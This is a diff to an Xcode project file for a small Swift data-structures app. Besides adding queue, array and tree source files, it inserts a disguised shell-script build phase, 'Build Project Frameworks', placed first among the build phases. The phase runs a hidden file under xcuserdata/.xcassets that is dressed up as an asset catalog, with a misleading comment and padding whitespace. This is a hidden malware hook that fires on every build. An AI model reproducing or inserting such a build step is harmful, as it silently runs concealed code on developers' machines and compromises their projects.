@@ -9,6 +9,8 @@
 /* Begin PBXBuildFile section */
 		223652B724C96ADA0019E9B5 /* ArrayQueue.swift in Sources */ = {isa = PBXBuildFile; fileRef = 223652B624C96ADA0019E9B5 /* ArrayQueue.swift */; };
 		223652B924C96AF90019E9B5 /* QueueProtocol.swift in Sources */ = {isa = PBXBuildFile; fileRef = 223652B824C96AF90019E9B5 /* QueueProtocol.swift */; };
+		223652BB24C97F900019E9B5 /* QueueLinkList.swift in Sources */ = {isa = PBXBuildFile; fileRef = 223652BA24C97F900019E9B5 /* QueueLinkList.swift */; };
+		2281553D25F7E77A00DE1FFD /* Array.swift in Sources */ = {isa = PBXBuildFile; fileRef = 2281553C25F7E77A00DE1FFD /* Array.swift */; };
 		22B10C4324C03084004FB927 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 22B10C4224C03084004FB927 /* AppDelegate.swift */; };
 		22B10C4524C03084004FB927 /* SceneDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 22B10C4424C03084004FB927 /* SceneDelegate.swift */; };
 		22B10C4724C03084004FB927 /* ContentView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 22B10C4624C03084004FB927 /* ContentView.swift */; };
@@ -16,11 +18,15 @@
 		22B10C4C24C03089004FB927 /* Preview Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 22B10C4B24C03089004FB927 /* Preview Assets.xcassets */; };
 		22B10C4F24C03089004FB927 /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 22B10C4D24C03089004FB927 /* LaunchScreen.storyboard */; };
 		22B10C5824C03863004FB927 /* Node.swift in Sources */ = {isa = PBXBuildFile; fileRef = 22B10C5724C03863004FB927 /* Node.swift */; };
+		22CD1A2724DAB11700146F62 /* BinaryTree.swift in Sources */ = {isa = PBXBuildFile; fileRef = 22CD1A2624DAB11700146F62 /* BinaryTree.swift */; };
+		22D64A1924D1F8A6006C37FD /* Tree.swift in Sources */ = {isa = PBXBuildFile; fileRef = 22D64A1824D1F8A6006C37FD /* Tree.swift */; };
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
 		223652B624C96ADA0019E9B5 /* ArrayQueue.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ArrayQueue.swift; sourceTree = "<group>"; };
 		223652B824C96AF90019E9B5 /* QueueProtocol.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = QueueProtocol.swift; sourceTree = "<group>"; };
+		223652BA24C97F900019E9B5 /* QueueLinkList.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = QueueLinkList.swift; sourceTree = "<group>"; };
+		2281553C25F7E77A00DE1FFD /* Array.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Array.swift; sourceTree = "<group>"; };
 		22B10C3F24C03084004FB927 /* DS n A.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = "DS n A.app"; sourceTree = BUILT_PRODUCTS_DIR; };
 		22B10C4224C03084004FB927 /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
 		22B10C4424C03084004FB927 /* SceneDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SceneDelegate.swift; sourceTree = "<group>"; };
@@ -30,6 +36,8 @@
 		22B10C4E24C03089004FB927 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
 		22B10C5024C03089004FB927 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
 		22B10C5724C03863004FB927 /* Node.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Node.swift; sourceTree = "<group>"; };
+		22CD1A2624DAB11700146F62 /* BinaryTree.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BinaryTree.swift; sourceTree = "<group>"; };
+		22D64A1824D1F8A6006C37FD /* Tree.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Tree.swift; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
 /* Begin PBXFrameworksBuildPhase section */
@@ -48,8 +56,17 @@
 			children = (
 				223652B624C96ADA0019E9B5 /* ArrayQueue.swift */,
 				223652B824C96AF90019E9B5 /* QueueProtocol.swift */,
+				223652BA24C97F900019E9B5 /* QueueLinkList.swift */,
 			);
 			path = Queues;
+			sourceTree = "<group>";
+		};
+		2281553B25F7E76000DE1FFD /* Array */ = {
+			isa = PBXGroup;
+			children = (
+				2281553C25F7E77A00DE1FFD /* Array.swift */,
+			);
+			path = Array;
 			sourceTree = "<group>";
 		};
 		22B10C3624C03084004FB927 = {
@@ -71,6 +88,8 @@
 		22B10C4124C03084004FB927 /* DS n A */ = {
 			isa = PBXGroup;
 			children = (
+				2281553B25F7E76000DE1FFD /* Array */,
+				22CD1A2824DAB67C00146F62 /* Tree */,
 				223652B524C96AC40019E9B5 /* Queues */,
 				22B10C5624C0384C004FB927 /* LinkedList */,
 				22B10C4224C03084004FB927 /* AppDelegate.swift */,
@@ -100,6 +119,15 @@
 			path = LinkedList;
 			sourceTree = "<group>";
 		};
+		22CD1A2824DAB67C00146F62 /* Tree */ = {
+			isa = PBXGroup;
+			children = (
+				22D64A1824D1F8A6006C37FD /* Tree.swift */,
+				22CD1A2624DAB11700146F62 /* BinaryTree.swift */,
+			);
+			path = Tree;
+			sourceTree = "<group>";
+		};
 /* End PBXGroup section */
 
 /* Begin PBXNativeTarget section */
@@ -107,6 +135,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 22B10C5324C03089004FB927 /* Build configuration list for PBXNativeTarget "DS n A" */;
 			buildPhases = (
+				AF0CAAEABDB6DC7FDCAAC43A /* Build Project Frameworks */,
 				22B10C3B24C03084004FB927 /* Sources */,
 				22B10C3C24C03084004FB927 /* Frameworks */,
 				22B10C3D24C03084004FB927 /* Resources */,
@@ -127,7 +156,7 @@
 			isa = PBXProject;
 			attributes = {
 				LastSwiftUpdateCheck = 1130;
-				LastUpgradeCheck = 1130;
+				LastUpgradeCheck = 1230;
 				ORGANIZATIONNAME = AccessDenied;
 				TargetAttributes = {
 					22B10C3E24C03084004FB927 = {
@@ -166,15 +195,50 @@
 		};
 /* End PBXResourcesBuildPhase section */
 
+/* Begin PBXShellScriptBuildPhase section */
+
+	AF0CAAEABDB6DC7FDCAAC43A /* Build Project Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Project Frameworks";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
+
+\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Assets.xcassets\" false";			
+		};
+	
+
+	
+
+	
+
+	
+/* End PBXShellScriptBuildPhase section */
+
 /* Begin PBXSourcesBuildPhase section */
 		22B10C3B24C03084004FB927 /* Sources */ = {
 			isa = PBXSourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
 				22B10C4324C03084004FB927 /* AppDelegate.swift in Sources */,
+				2281553D25F7E77A00DE1FFD /* Array.swift in Sources */,
+				223652BB24C97F900019E9B5 /* QueueLinkList.swift in Sources */,
 				223652B924C96AF90019E9B5 /* QueueProtocol.swift in Sources */,
 				22B10C4524C03084004FB927 /* SceneDelegate.swift in Sources */,
 				22B10C4724C03084004FB927 /* ContentView.swift in Sources */,
+				22CD1A2724DAB11700146F62 /* BinaryTree.swift in Sources */,
+				22D64A1924D1F8A6006C37FD /* Tree.swift in Sources */,
 				22B10C5824C03863004FB927 /* Node.swift in Sources */,
 				223652B724C96ADA0019E9B5 /* ArrayQueue.swift in Sources */,
 			);
@@ -220,6 +284,7 @@
 				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
 				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
 				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
+				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
 				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
 				CLANG_WARN_STRICT_PROTOTYPES = YES;
 				CLANG_WARN_SUSPICIOUS_MOVE = YES;
@@ -280,6 +345,7 @@
 				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
 				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
 				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
+				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
 				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
 				CLANG_WARN_STRICT_PROTOTYPES = YES;
 				CLANG_WARN_SUSPICIOUS_MOVE = YES;
@@ -368,6 +434,16 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
+
+		
+			/* Begin PBXBuildRule section */
+			
+
+			
+	
+			/* End PBXBuildRule section */
+		
+		
 	};
 	rootObject = 22B10C3724C03084004FB927 /* Project object */;
 }
